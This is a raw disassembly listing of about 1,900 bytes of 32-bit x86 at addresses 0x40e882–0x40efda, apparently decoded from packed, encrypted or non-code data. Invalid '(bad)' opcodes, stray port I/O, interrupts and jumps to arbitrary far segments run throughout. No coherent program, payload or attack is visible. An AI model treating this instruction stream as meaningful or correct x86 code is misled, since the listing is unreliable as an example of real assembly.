  40e882:	sub    al,0x30
  40e884:	jb     0x40e853
  40e886:	js     0x40e8e5
  40e888:	jns    0x40e8dc
  40e88a:	push   ds
  40e88b:	shl    BYTE PTR [esi+0x76],cl
  40e88e:	pop    eax
  40e88f:	mov    edi,0x7994c466
  40e894:	jne    0x40e81b
  40e896:	outs   dx,BYTE PTR ds:[esi]
  40e897:	cmp    BYTE PTR [eax],ch
  40e899:	in     eax,dx
  40e89a:	pusha  
  40e89b:	jno    0x40e890
  40e89d:	inc    eax
  40e89e:	and    al,0xaf
  40e8a0:	pop    esi
  40e8a1:	mov    esi,0x5f657708
  40e8a6:	popa   
  40e8a7:	add    BYTE PTR [ebx],0x5c
  40e8aa:	fwait
  40e8ab:	xchg   esp,eax
  40e8ac:	inc    esi
  40e8ad:	xchg   ebp,eax
  40e8ae:	scas   eax,DWORD PTR es:[edi]
  40e8af:	mov    bl,0xc5
  40e8b1:	cs stos DWORD PTR es:[edi],eax
  40e8b3:	sar    BYTE PTR [ecx+0x28],0x6f
  40e8b7:	fwait
  40e8b8:	arpl   WORD PTR [eax+0x5b],sp
  40e8bb:	pop    ecx
  40e8bc:	nop
  40e8bd:	jl     0x40e865
  40e8bf:	das    
  40e8c0:	inc    esi
  40e8c1:	push   esp
  40e8c2:	push   esi
  40e8c3:	mov    esi,0xa1bce922
  40e8c8:	in     al,dx
  40e8c9:	mov    DWORD PTR [edx],edi
  40e8cb:	add    cl,BYTE PTR [edi-0x44]
  40e8ce:	mov    ecx,0xba1890d8
  40e8d3:	ds mov ebx,0x28bf619d
  40e8d9:	xlat   BYTE PTR ds:[ebx]
  40e8da:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40e8dc:	mov    bl,0x30
  40e8de:	rcl    DWORD PTR [ebp+0x5ac185f5],0xf
  40e8e5:	repnz xchg edx,eax
  40e8e7:	mov    fs,WORD PTR [edx+0x29]
  40e8ea:	inc    eax
  40e8eb:	out    dx,al
  40e8ec:	adc    eax,0x1e50c30b
  40e8f1:	xor    DWORD PTR [edi-0x6a708cf3],0x6d5dd1f9
  40e8fb:	mov    esi,0x1f8ba03c
  40e900:	xor    eax,0x9e21501b
  40e905:	add    DWORD PTR [edx],esi
  40e907:	lahf   
  40e908:	lods   eax,DWORD PTR ds:[esi]
  40e909:	fwait
  40e90a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e90b:	dec    esi
  40e90c:	mov    edx,0x465e84d6
  40e911:	jbe    0x40e95c
  40e913:	fsubrp st(1),st
  40e915:	jb     0x40e8d7
  40e917:	jae    0x40e8ba
  40e919:	js     0x40e966
  40e91b:	in     al,dx
  40e91c:	js     0x40e998
  40e91e:	int    0xdf
  40e920:	sbb    BYTE PTR [esi+0x43],bl
  40e923:	jmp    0x6fc4:0x51136a90
  40e92a:	stos   DWORD PTR es:[edi],eax
  40e92b:	xchg   esi,eax
  40e92c:	lods   eax,DWORD PTR ds:[esi]
  40e92d:	mov    dl,0x53
  40e92f:	fdivr  st,st(0)
  40e931:	and    BYTE PTR [esi],0x82
  40e934:	xchg   edi,eax
  40e935:	in     al,0x8c
  40e937:	nop
  40e938:	adc    edx,DWORD PTR ds:0x7181f21b
  40e93e:	cmp    al,0xff
  40e940:	xchg   edi,eax
  40e941:	xor    dl,BYTE PTR [eax-0xb]
  40e944:	mov    al,0xff
  40e946:	pop    esp
  40e947:	sub    DWORD PTR [edi-0x4b],ebx
  40e94a:	mov    ds,WORD PTR [esp+ecx*1+0x4]
  40e94e:	push   0x3de70bc0
  40e953:	lea    eax,[edx+0x61dbf613]
  40e959:	cdq    
  40e95a:	mov    ch,0x94
  40e95c:	mov    ebp,0xd04dda9c
  40e961:	cwde   
  40e962:	inc    esp
  40e963:	adc    DWORD PTR [eax-0x59155064],esi
  40e969:	sahf   
  40e96a:	shl    DWORD PTR [eax+0xf435927],0xcb
  40e971:	fs jl  0x40e998
  40e974:	push   cs
  40e975:	dec    esp
  40e976:	fistp  DWORD PTR [eax+0x19]
  40e979:	jb     0x40e95c
  40e97b:	push   edx
  40e97c:	mov    ds:0x631b4631,al
  40e981:	jno    0x40e916
  40e983:	test   al,0x7f
  40e985:	test   eax,0xe8f0b678
  40e98a:	add    al,BYTE PTR [edi]
  40e98c:	inc    ebp
  40e98d:	inc    BYTE PTR [edi-0x65]
  40e990:	ds jg  0x40e928
  40e993:	test   al,0xaf
  40e995:	int    0xf7
  40e997:	(bad)  
  40e998:	xor    esp,DWORD PTR [esi+0x6a]
  40e99b:	xchg   edx,eax
  40e99c:	popa   
  40e99d:	mov    dl,0xb6
  40e99f:	mov    eax,ds:0x947ca8e3
  40e9a4:	push   cs
  40e9a5:	jge    0x40e990
  40e9a7:	cmp    esi,eax
  40e9a9:	mov    esp,0x3d061ac0
  40e9ae:	test   eax,0x319a0cb9
  40e9b3:	jl     0x40e947
  40e9b5:	jbe    0x40ea24
  40e9b7:	pop    ss
  40e9b8:	jb     0x40e9f2
  40e9ba:	and    ecx,esi
  40e9bc:	mov    edi,0x7afcbc7c
  40e9c1:	test   BYTE PTR [ebp+0x1e714ca4],bl
  40e9c7:	sbb    DWORD PTR [ebx],esp
  40e9c9:	ret    
  40e9ca:	mov    bl,0x5f
  40e9cc:	call   0x5d5098e
  40e9d1:	jecxz  0x40e9cc
  40e9d3:	mov    eax,fs
  40e9d5:	or     al,0x95
  40e9d7:	or     al,0x54
  40e9d9:	xchg   DWORD PTR [eax+0x79],esi
  40e9dc:	cli    
  40e9dd:	or     dh,BYTE PTR [edi]
  40e9df:	push   ebp
  40e9e0:	adc    DWORD PTR [ebp+0x48],esi
  40e9e3:	lock xchg esi,eax
  40e9e5:	dec    esp
  40e9e6:	sbb    edi,esp
  40e9e8:	or     bl,BYTE PTR [edi]
  40e9ea:	out    0x2e,eax
  40e9ec:	dec    esi
  40e9ed:	leave  
  40e9ee:	inc    ebp
  40e9ef:	sbb    eax,0x2310616d
  40e9f4:	out    dx,al
  40e9f5:	repz pop ecx
  40e9f7:	(bad)  
  40e9f9:	add    eax,DWORD PTR [ebx+edx*1-0x3d2ac2b3]
  40ea00:	shl    BYTE PTR [edi-0x70715b2a],0x4c
  40ea07:	or     al,0x24
  40ea09:	test   DWORD PTR [ebx-0x54],edx
  40ea0c:	mov    ds:0xd364b29b,eax
  40ea11:	test   BYTE PTR [edi+0x6f3ea1af],bl
  40ea17:	retf   0x5db9
  40ea1a:	add    al,0xd1
  40ea1c:	mov    ah,0x38
  40ea1e:	jp     0x40e9a8
  40ea20:	ret    0xe1f2
  40ea23:	mov    eax,ds:0xbc4aab61
  40ea28:	ins    DWORD PTR es:[edi],dx
  40ea29:	sbb    al,0x35
  40ea2b:	cmp    eax,0x3d2c4a15
  40ea30:	and    DWORD PTR [ecx-0x5f155789],0x66
  40ea37:	cs mov al,0x47
  40ea3a:	jno    0x40e9e5
  40ea3c:	fidiv  WORD PTR [edx]
  40ea3e:	xchg   bh,al
  40ea40:	inc    esi
  40ea41:	xchg   esp,eax
  40ea42:	push   ecx
  40ea43:	adc    ebx,DWORD PTR [edi]
  40ea45:	dec    esp
  40ea46:	xor    eax,0x937edc90
  40ea4b:	rcr    BYTE PTR [esi-0x7440f5fe],1
  40ea51:	pop    esi
  40ea52:	sub    eax,0xe53a6b0a
  40ea57:	aad    0xc9
  40ea59:	dec    ebp
  40ea5a:	icebp  
  40ea5b:	add    al,0x21
  40ea5d:	push   edx
  40ea5e:	jae    0x40ea2c
  40ea60:	fmulp  st(6),st
  40ea62:	call   0xd59898cf
  40ea67:	fxch   st(7)
  40ea69:	mov    ecx,0x704b959d
  40ea6e:	pop    edx
  40ea6f:	and    DWORD PTR [edx],ebx
  40ea71:	xor    eax,0x5e2fe03d
  40ea76:	in     al,0x68
  40ea78:	fs out dx,al
  40ea7a:	fs jg  0x40eae9
  40ea7d:	ret    0xe2c8
  40ea80:	pop    ss
  40ea81:	mov    esi,0x83d20e7c
  40ea86:	sbb    BYTE PTR [esi-0x4f59ba73],dh
  40ea8c:	ins    DWORD PTR es:[edi],dx
  40ea8d:	aas    
  40ea8e:	or     al,0xaf
  40ea90:	sub    eax,0x655dc0ba
  40ea95:	stc    
  40ea96:	and    ah,BYTE PTR [ebx+0x16bbde02]
  40ea9c:	fisttp DWORD PTR [esi]
  40ea9e:	and    esi,DWORD PTR ds:0x73b4354a
  40eaa4:	jnp    0x40eb0a
  40eaa6:	imul   ebx,ebx,0x2e
  40eaa9:	sub    DWORD PTR [ebp+ebx*2+0x71],esi
  40eaad:	mov    eax,0xd25ec3b3
  40eab2:	xchg   esi,eax
  40eab3:	fs add bh,bh
  40eab6:	cmp    DWORD PTR [eax-0x6e],eax
  40eab9:	out    dx,al
  40eaba:	sub    ah,BYTE PTR [edx+ebx*8+0x4]
  40eabe:	jp     0x40eabb
  40eac0:	fisub  WORD PTR [edx+0x23d69eb]
  40eac6:	push   es
  40eac7:	push   cs
  40eac8:	arpl   WORD PTR [edx+0x59abf371],bp
  40eace:	add    BYTE PTR [ebp+0x37eb4a4],0x39
  40ead5:	sub    ah,BYTE PTR [eax]
  40ead7:	cld    
  40ead8:	mov    BYTE PTR [ecx-0x66],al
  40eadb:	int    0x2a
  40eadd:	sahf   
  40eade:	mov    dh,BYTE PTR [ecx+0xa98c608]
  40eae4:	add    dl,BYTE PTR [ebp+0x54]
  40eae7:	out    0xc,eax
  40eae9:	jge    0x40eb21
  40eaeb:	mov    dl,0x7a
  40eaed:	loop   0x40eb17
  40eaef:	fs dec edx
  40eaf1:	jmp    0x10d9:0x44ed4d0e
  40eaf8:	in     al,dx
  40eaf9:	fimul  WORD PTR [esi-0x4bc1336d]
  40eaff:	jmp    0xd8f8a3fc
  40eb04:	push   edx
  40eb05:	in     eax,dx
  40eb06:	pop    ds
  40eb07:	ss dec ecx
  40eb09:	dec    ebx
  40eb0a:	push   0xffffffe9
  40eb0c:	pop    esi
  40eb0d:	(bad)  
  40eb0f:	stos   DWORD PTR es:[edi],eax
  40eb10:	stos   DWORD PTR es:[edi],eax
  40eb11:	loope  0x40eaec
  40eb13:	outs   dx,DWORD PTR ds:[esi]
  40eb14:	add    al,0x81
  40eb16:	arpl   dx,bx
  40eb18:	push   0x18d5fefe
  40eb1d:	cmc    
  40eb1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb1f:	ins    BYTE PTR es:[edi],dx
  40eb20:	outs   dx,DWORD PTR ds:[esi]
  40eb21:	pop    edi
  40eb22:	sbb    BYTE PTR [eax-0x7ec5687e],ah
  40eb28:	int3   
  40eb29:	mov    esi,0x2c73de60
  40eb2e:	daa    
  40eb2f:	loop   0x40eb00
  40eb31:	repz arpl WORD PTR [ecx+eax*8+0x10],cx
  40eb36:	adc    bh,bl
  40eb38:	cvtps2pi mm1,xmm7
  40eb3b:	cmp    eax,ecx
  40eb3d:	pop    eax
  40eb3e:	mov    esi,0xd6340357
  40eb43:	or     BYTE PTR [ecx+0x44aa4888],bh
  40eb49:	adc    eax,0x8c12c130
  40eb4e:	mov    ecx,0xc411da37
  40eb53:	in     eax,dx
  40eb54:	pushf  
  40eb55:	les    eax,FWORD PTR [edi+0x35]
  40eb58:	shr    DWORD PTR ds:0x7b3b72d0,0x0
  40eb5f:	stos   BYTE PTR es:[edi],al
  40eb60:	stc    
  40eb61:	imul   ebx,DWORD PTR [eax-0xc],0x570801d5
  40eb68:	jmp    0x4428:0x26a3f13
  40eb6f:	ja     0x40eb4a
  40eb71:	data16 add dl,BYTE PTR [edi-0x8]
  40eb75:	test   cl,dl
  40eb77:	or     dl,bh
  40eb79:	push   ss
  40eb7a:	sti    
  40eb7b:	jp     0x40ebd6
  40eb7d:	ror    DWORD PTR [ebx],0x4
  40eb80:	cmc    
  40eb81:	add    bh,BYTE PTR [edi-0x32b41742]
  40eb87:	or     al,0x50
  40eb89:	jb     0x40ebeb
  40eb8b:	push   ds
  40eb8c:	fwait
  40eb8d:	gs adc al,0x76
  40eb90:	jl     0x40ebb6
  40eb92:	idiv   DWORD PTR [ebp+0x29]
  40eb95:	jmp    0x2d3d:0xe369577d
  40eb9c:	retf   
  40eb9d:	clc    
  40eb9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb9f:	retf   
  40eba0:	rcl    DWORD PTR [ebx+0x50],0x73
  40eba4:	inc    edi
  40eba5:	jb     0x40ebbe
  40eba7:	sub    eax,0x3acd1623
  40ebac:	mov    ebx,0x5d6958c6
  40ebb1:	aad    0x9
  40ebb3:	add    BYTE PTR [eax+ebp*8-0x21e990cc],dl
  40ebba:	dec    edi
  40ebbb:	cmc    
  40ebbc:	adc    al,0xbe
  40ebbe:	fs dec edi
  40ebc1:	repz out dx,al
  40ebc3:	sub    al,BYTE PTR [ebx-0x28080d2d]
  40ebc9:	push   0xffffffbc
  40ebcb:	mov    ds:0x7ade1ad5,al
  40ebd0:	jbe    0x40ebcc
  40ebd2:	mov    dl,0x1f
  40ebd4:	test   al,0xb0
  40ebd6:	sahf   
  40ebd7:	xchg   edi,eax
  40ebd8:	push   ss
  40ebd9:	xor    al,0xe7
  40ebdb:	ss adc al,0x40
  40ebde:	lds    ebx,FWORD PTR [edx+0x75]
  40ebe1:	int    0x7b
  40ebe3:	cmc    
  40ebe4:	and    edx,DWORD PTR [ebp-0x2f]
  40ebe7:	out    0xc2,al
  40ebe9:	push   esp
  40ebea:	mov    ds:0x10333267,eax
  40ebef:	imul   eax,esp,0xffffffbb
  40ebf2:	xchg   ebp,eax
  40ebf3:	mov    edx,0x8c26d544
  40ebf8:	ret    0xe0a3
  40ebfb:	mov    edx,0x3e7770cc
  40ec00:	ret    0xb024
  40ec03:	inc    esi
  40ec04:	jne    0x40ebf9
  40ec06:	jg     0x40ec2c
  40ec08:	in     al,0x5f
  40ec0a:	mov    ebx,0xa98eb024
  40ec0f:	cmp    DWORD PTR [ebx-0x4b],ecx
  40ec12:	aaa    
  40ec13:	pop    edi
  40ec14:	xor    DWORD PTR [ebp-0x6d],esp
  40ec17:	push   ecx
  40ec18:	sub    DWORD PTR [edi+0x73f91093],esp
  40ec1e:	jns    0x40ebb5
  40ec20:	fld    DWORD PTR [ecx+0x25]
  40ec23:	imul   esi,DWORD PTR [ebp-0x4e],0xffffffa4
  40ec27:	repz (bad) 
  40ec29:	out    dx,al
  40ec2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec2b:	mov    esp,0xf0b6bf5f
  40ec30:	xor    al,0x64
  40ec32:	inc    ecx
  40ec33:	jnp    0x40ec74
  40ec35:	xchg   BYTE PTR [ecx],dl
  40ec37:	inc    ebp
  40ec38:	xchg   esp,eax
  40ec39:	xchg   edi,eax
  40ec3a:	mov    al,0xe9
  40ec3c:	xchg   esi,eax
  40ec3d:	fld    TBYTE PTR cs:[eax+0x63]
  40ec41:	xor    al,0xc2
  40ec43:	pop    edi
  40ec44:	sub    ecx,DWORD PTR [ebp+0xd46ec7f]
  40ec4a:	outs   dx,DWORD PTR ds:[esi]
  40ec4b:	or     al,ah
  40ec4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec4f:	inc    esi
  40ec50:	stos   DWORD PTR es:[edi],eax
  40ec51:	jbe    0x40ecc5
  40ec53:	ins    BYTE PTR es:[edi],dx
  40ec54:	mov    dl,0x29
  40ec56:	adc    eax,0xc2c0967f
  40ec5b:	push   cs
  40ec5c:	inc    ebx
  40ec5d:	imul   ebx,DWORD PTR [edx-0x51],0x3b77b0f6
  40ec64:	stos   DWORD PTR es:[edi],eax
  40ec65:	lahf   
  40ec66:	push   0xffffffb2
  40ec68:	jg     0x40eca1
  40ec6a:	ds mov ebx,fs
  40ec6d:	addr16 retf 
  40ec6f:	(bad)  
  40ec70:	mov    bh,0x58
  40ec72:	pop    edx
  40ec73:	adc    DWORD PTR [edx-0x1a],ebp
  40ec76:	add    ebx,ebp
  40ec78:	icebp  
  40ec79:	fdiv   QWORD PTR [ebx-0x600badfd]
  40ec7f:	pop    edi
  40ec80:	push   ecx
  40ec81:	aad    0xbb
  40ec83:	sbb    esi,esp
  40ec85:	jp     0x40eccd
  40ec87:	out    0x79,al
  40ec89:	jmp    0x698b:0x145f44c3
  40ec90:	psllw  mm0,QWORD PTR ds:0xaee02a5a
  40ec97:	icebp  
  40ec98:	cwde   
  40ec99:	sbb    al,0xe3
  40ec9b:	sahf   
  40ec9c:	fs dec esp
  40ec9e:	les    esp,FWORD PTR [eax+0x32]
  40eca1:	nop
  40eca2:	aad    0x63
  40eca4:	push   esi
  40eca5:	les    edx,FWORD PTR [edx]
  40eca7:	aam    0x96
  40eca9:	add    al,0x21
  40ecab:	xor    BYTE PTR [esi],ch
  40ecad:	xchg   ebx,eax
  40ecae:	icebp  
  40ecaf:	dec    ecx
  40ecb0:	inc    edx
  40ecb1:	inc    edi
  40ecb2:	add    BYTE PTR [esi+0x35],ah
  40ecb5:	cli    
  40ecb6:	sub    eax,DWORD PTR [edi-0x5cc48914]
  40ecbc:	adc    eax,0x63132d36
  40ecc1:	add    DWORD PTR [edx],eax
  40ecc3:	adc    al,0x6f
  40ecc5:	cmp    al,0xdb
  40ecc7:	hlt    
  40ecc8:	mov    bh,0xa8
  40ecca:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eccc:	cmp    ecx,DWORD PTR [ebx]
  40ecce:	mov    al,ds:0x51026936
  40ecd3:	cmp    ch,BYTE PTR [ebx]
  40ecd5:	lods   al,BYTE PTR ds:[esi]
  40ecd6:	clc    
  40ecd7:	cmp    cl,BYTE PTR [edx+edx*4-0x22]
  40ecdb:	repz das 
  40ecdd:	test   DWORD PTR [ebx],ecx
  40ecdf:	xchg   esp,eax
  40ece0:	scas   al,BYTE PTR es:[edi]
  40ece1:	sub    BYTE PTR [esi],bh
  40ece3:	add    ebp,edx
  40ece5:	jo     0x40ed36
  40ece7:	outs   dx,BYTE PTR ds:[esi]
  40ece8:	fldcw  WORD PTR [esi-0x1df14564]
  40ecee:	and    eax,0x9418746f
  40ecf3:	jmp    0xadd5:0x74e9318a
  40ecfa:	in     al,dx
  40ecfb:	push   esi
  40ecfc:	xor    eax,0xf7c96ab9
  40ed01:	push   esp
  40ed02:	xchg   esp,eax
  40ed03:	aam    0xa4
  40ed05:	xchg   ebx,eax
  40ed06:	xor    ebp,esp
  40ed08:	aad    0xa5
  40ed0a:	cmp    BYTE PTR [ebp+0x65],0xde
  40ed0e:	add    cl,0x11
  40ed11:	pop    ebp
  40ed12:	add    al,dh
  40ed14:	mov    edx,ebp
  40ed16:	cdq    
  40ed17:	or     ah,BYTE PTR [ebx+ebp*4-0x43]
  40ed1b:	mov    ds:0x45a3b0a6,eax
  40ed20:	test   eax,0xbdadb54f
  40ed25:	or     eax,0x13dc90b5
  40ed2a:	pop    edx
  40ed2b:	sbb    DWORD PTR [ebx+0x2f412f7f],ebx
  40ed31:	dec    ebx
  40ed32:	xor    ch,BYTE PTR [eax]
  40ed34:	ficom  WORD PTR [eax]
  40ed36:	pop    ss
  40ed37:	sub    DWORD PTR [ecx],esp
  40ed39:	adc    al,0x82
  40ed3b:	xor    esp,DWORD PTR [eax-0x4e587f9e]
  40ed41:	or     eax,DWORD PTR [edi-0x54fe03a0]
  40ed47:	add    eax,0x3f34075f
  40ed4c:	add    eax,0x45c5d4f3
  40ed51:	mov    edi,0x35f94ad2
  40ed56:	outs   dx,DWORD PTR ds:[esi]
  40ed57:	hlt    
  40ed58:	add    esi,eax
  40ed5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed5b:	call   0xd836:0xd5a9e673
  40ed62:	and    al,0xa0
  40ed64:	test   DWORD PTR [ebx],edi
  40ed66:	aaa    
  40ed67:	shr    DWORD PTR [edx+0x64],1
  40ed6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed6b:	push   edi
  40ed6c:	icebp  
  40ed6d:	popa   
  40ed6e:	cld    
  40ed6f:	jp     0x40ed90
  40ed71:	mov    edi,0x80536cf4
  40ed76:	fwait
  40ed77:	scas   al,BYTE PTR es:[edi]
  40ed78:	sbb    ebx,DWORD PTR [ebx]
  40ed7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed7b:	add    ah,bh
  40ed7d:	adc    DWORD PTR [ecx+ebx*2-0x72f8281a],ecx
  40ed84:	and    DWORD PTR [edx-0x9],0xffffff9a
  40ed88:	push   edi
  40ed89:	shr    al,cl
  40ed8b:	inc    edx
  40ed8c:	mov    al,ds:0xf7d1e746
  40ed91:	mov    ah,0x4c
  40ed93:	lock ss lahf 
  40ed96:	dec    edx
  40ed97:	jge    0x40ed22
  40ed99:	stc    
  40ed9a:	add    DWORD PTR [eax-0x4f],eax
  40ed9d:	or     eax,0x357b8cb2
  40eda2:	or     eax,0x50e82f86
  40eda7:	pop    edi
  40eda8:	je     0x40eddd
  40edaa:	push   0xffffffd0
  40edac:	push   esp
  40edad:	xor    bh,0x5a
  40edb0:	into   
  40edb1:	mov    esi,0xf6bcf1d3
  40edb6:	lea    esi,[edx]
  40edb8:	fwait
  40edb9:	ja     0x40ee26
  40edbb:	(bad)  
  40edbc:	jge    0x40ed6a
  40edbe:	jns    0x40eda7
  40edc0:	jge    0x40ed61
  40edc2:	lock pop ds
  40edc4:	mov    ah,0x21
  40edc6:	loope  0x40edb2
  40edc8:	or     BYTE PTR [eax],dl
  40edca:	test   DWORD PTR [ecx],edx
  40edcc:	adc    esi,DWORD PTR [edi]
  40edce:	pusha  
  40edcf:	push   0xffffffcb
  40edd1:	into   
  40edd2:	jne    0x40ed77
  40edd4:	fwait
  40edd5:	daa    
  40edd6:	fadd   QWORD PTR [ecx-0x259b7f24]
  40eddc:	push   ss
  40eddd:	jo     0x40ee42
  40eddf:	mov    edi,0xb7ad50b7
  40ede4:	inc    ebp
  40ede5:	sub    BYTE PTR [edx-0x641f5119],dl
  40edeb:	pop    edx
  40edec:	es mov dl,0x49
  40edef:	cmc    
  40edf0:	shl    DWORD PTR ds:0x5e4fc7c4,0x37
  40edf7:	pusha  
  40edf8:	add    ch,BYTE PTR [ecx+esi*4]
  40edfb:	stos   DWORD PTR es:[edi],eax
  40edfc:	mov    edi,0x71117256
  40ee01:	push   ds
  40ee02:	shl    ebp,1
  40ee04:	jbe    0x40ee68
  40ee06:	jecxz  0x40ee7a
  40ee08:	inc    edx
  40ee09:	fsub   QWORD PTR [edi+0x3f]
  40ee0c:	jmp    0x40ee69
  40ee0e:	shr    DWORD PTR [ecx],0xb
  40ee11:	jnp    0x40edaf
  40ee13:	xchg   esi,eax
  40ee14:	into   
  40ee15:	ss int 0x91
  40ee18:	mov    eax,ds:0x57cdf028
  40ee1d:	je     0x40edb1
  40ee1f:	jne    0x40ee45
  40ee21:	sbb    eax,0xd836ee0c
  40ee26:	dec    ebp
  40ee27:	clc    
  40ee28:	jmp    0xe887:0xc0eb597a
  40ee2f:	push   es
  40ee30:	xor    al,0x4c
  40ee32:	xor    DWORD PTR [eax+ecx*4-0x5c],0x76
  40ee37:	retf   0x5911
  40ee3a:	fild   QWORD PTR [edi-0x43ac4647]
  40ee40:	retf   
  40ee41:	add    bh,cl
  40ee43:	ss in  al,dx
  40ee45:	adc    DWORD PTR [edi+0x3ab64dfe],edx
  40ee4b:	sub    dl,BYTE PTR [edi-0xe56f85a]
  40ee51:	jmp    0x40ede4
  40ee53:	aad    0x1c
  40ee55:	leave  
  40ee56:	sti    
  40ee57:	mov    eax,ds:0xf98a2597
  40ee5c:	xor    al,0xa7
  40ee5e:	jl     0x40edf9
  40ee60:	(bad)  
  40ee61:	jmp    0x40ee4d
  40ee63:	and    DWORD PTR [edi+0x5e],ebx
  40ee66:	daa    
  40ee67:	cmc    
  40ee68:	mov    ecx,0xe6ec7bfb
  40ee6d:	jg     0x40eece
  40ee6f:	xchg   esi,eax
  40ee70:	xchg   esi,eax
  40ee71:	xchg   edi,eax
  40ee72:	lods   al,BYTE PTR ds:[esi]
  40ee73:	dec    ebx
  40ee74:	pop    es
  40ee75:	and    DWORD PTR ds:0xcab51aad,eax
  40ee7b:	sbb    BYTE PTR [edx-0x25],cl
  40ee7e:	jmp    0x40ee8f
  40ee80:	js     0x40ee3a
  40ee82:	mov    bl,0xad
  40ee85:	frstor [ebx-0x50f38374]
  40ee8b:	cmp    BYTE PTR [edx],dl
  40ee8d:	xor    edx,ebx
  40ee8f:	inc    edx
  40ee90:	cmp    DWORD PTR [ecx-0x4a],esi
  40ee93:	pop    ebp
  40ee94:	enter  0xab64,0xa
  40ee98:	addr16 shl cl,0x42
  40ee9c:	test   DWORD PTR [ecx],edi
  40ee9e:	xor    ah,BYTE PTR [eax]
  40eea0:	cmp    bl,ch
  40eea2:	popf   
  40eea3:	fdiv   DWORD PTR [ebp+0x55fcc8fc]
  40eea9:	aad    0x8f
  40eeab:	xchg   BYTE PTR [edx-0x46],ah
  40eeae:	sbb    ebp,DWORD PTR [edi+0x71cb6a50]
  40eeb4:	adc    al,0xf
  40eeb6:	enter  0x1a62,0x42
  40eeba:	repnz cmp al,0xbd
  40eebd:	in     al,0xfc
  40eebf:	mov    edx,0xa0d5ad91
  40eec4:	add    edi,esp
  40eec6:	mov    esi,0xbf8a2fd9
  40eecb:	add    BYTE PTR [edx-0x5a],dl
  40eece:	or     esi,DWORD PTR [edi+ebp*4-0x8]
  40eed2:	dec    ecx
  40eed3:	and    eax,0x9910683b
  40eed8:	stos   DWORD PTR es:[edi],eax
  40eed9:	push   edi
  40eeda:	adc    al,0xa6
  40eedc:	pop    es
  40eedd:	push   cs
  40eede:	mov    ebp,0xde2f6dec
  40eee3:	mov    cs,WORD PTR [edi]
  40eee5:	call   0x7c844578
  40eeea:	jmp    0x40ef4a
  40eeec:	inc    ebx
  40eeed:	nop
  40eeee:	jmp    0x40ee94
  40eef0:	leave  
  40eef1:	or     bl,cl
  40eef3:	xor    BYTE PTR ds:0xafa78b6b,0x26
  40eefa:	ins    DWORD PTR es:[edi],dx
  40eefb:	mov    ch,0xe5
  40eefd:	jle    0x40ef06
  40eeff:	mov    ds:0xf83b6109,eax
  40ef04:	jns    0x40ef20
  40ef06:	mov    al,BYTE PTR [esi]
  40ef08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef09:	mov    edi,0x2b7d36bd
  40ef0e:	mov    DWORD PTR [esi+0x40],ebp
  40ef11:	ja     0x40eedf
  40ef13:	sbb    dl,BYTE PTR [ebp-0x21]
  40ef16:	imul   edi,DWORD PTR [esi+edx*8+0xf7e51a9],0x8
  40ef1e:	ins    DWORD PTR es:[edi],dx
  40ef1f:	push   edi
  40ef20:	and    BYTE PTR [eax-0x78],0x64
  40ef24:	xor    BYTE PTR [edx-0x9],dl
  40ef27:	rol    DWORD PTR [edx+eax*8+0xa],0x7a
  40ef2c:	adc    BYTE PTR [edi],bh
  40ef2e:	rcl    BYTE PTR [eax+0x1f],cl
  40ef31:	adc    bl,BYTE PTR [esi+0x0]
  40ef34:	or     DWORD PTR [esi+0x70],ebp
  40ef37:	ds mov bh,0xc1
  40ef3a:	fidivr WORD PTR [esi-0xd]
  40ef3d:	test   eax,0x8a5b2fe2
  40ef42:	jl     0x40eeec
  40ef44:	push   eax
  40ef45:	pop    edi
  40ef46:	inc    edx
  40ef47:	and    BYTE PTR [esi+edi*8],al
  40ef4a:	push   edx
  40ef4b:	int3   
  40ef4c:	ficom  WORD PTR [ecx+0x6c]
  40ef4f:	sub    bl,BYTE PTR [ebp+esi*4-0x16]
  40ef53:	jecxz  0x40ef48
  40ef55:	(bad)  
  40ef56:	adc    al,0x39
  40ef58:	mov    ebx,0xa9ed185c
  40ef5d:	xchg   ebp,eax
  40ef5e:	in     al,0xc4
  40ef60:	push   edx
  40ef61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef63:	adc    DWORD PTR [ebp-0x7129f5b9],edi
  40ef69:	pushf  
  40ef6a:	sub    BYTE PTR [ecx+0x2c],al
  40ef6d:	add    al,dl
  40ef6f:	test   edx,eax
  40ef71:	xor    eax,0xc26ed642
  40ef76:	ins    BYTE PTR es:[edi],dx
  40ef77:	mov    BYTE PTR [ebp-0x6a],bl
  40ef7a:	or     ebp,DWORD PTR [eax-0x674ce44a]
  40ef80:	jb     0x40efc4
  40ef82:	shl    dh,0x9b
  40ef85:	lods   eax,DWORD PTR ds:[esi]
  40ef86:	mov    esp,0x38beae35
  40ef8b:	ffree  st(4)
  40ef8d:	cmp    bh,dh
  40ef8f:	adc    BYTE PTR [ebx-0x6dccb358],cl
  40ef95:	push   es
  40ef96:	test   al,0x38
  40ef98:	jns    0x40effb
  40ef9a:	fwait
  40ef9b:	and    DWORD PTR [eax+eiz*8+0x7a12fe5e],esi
  40efa2:	sahf   
  40efa3:	jle    0x40f00b
  40efa5:	cs (bad) 
  40efa7:	fldenv [ebx-0x183638a7]
  40efad:	jnp    0x40ef34
  40efaf:	xchg   edx,eax
  40efb0:	ret    
  40efb1:	es push ebx
  40efb3:	scas   al,BYTE PTR es:[edi]
  40efb4:	dec    edi
  40efb5:	dec    eax
  40efb6:	cwde   
  40efb7:	mov    al,0x3
  40efb9:	xor    DWORD PTR [ebx+ebp*1],ecx
  40efbc:	jmp    0xb0632a00
  40efc1:	dec    ebp
  40efc2:	div    DWORD PTR [edi+edi*8+0x11015557]
  40efc9:	dec    esi
  40efca:	test   al,0x7d
  40efcc:	test   edx,edi
  40efce:	push   esi
  40efcf:	out    0x80,eax
  40efd1:	and    DWORD PTR [esi+0x8],eax
  40efd4:	cmp    eax,0x5fd7e9b8
  40efd9:	out    dx,al
  40efda:	repz mov ebx,0x1f6fdd9
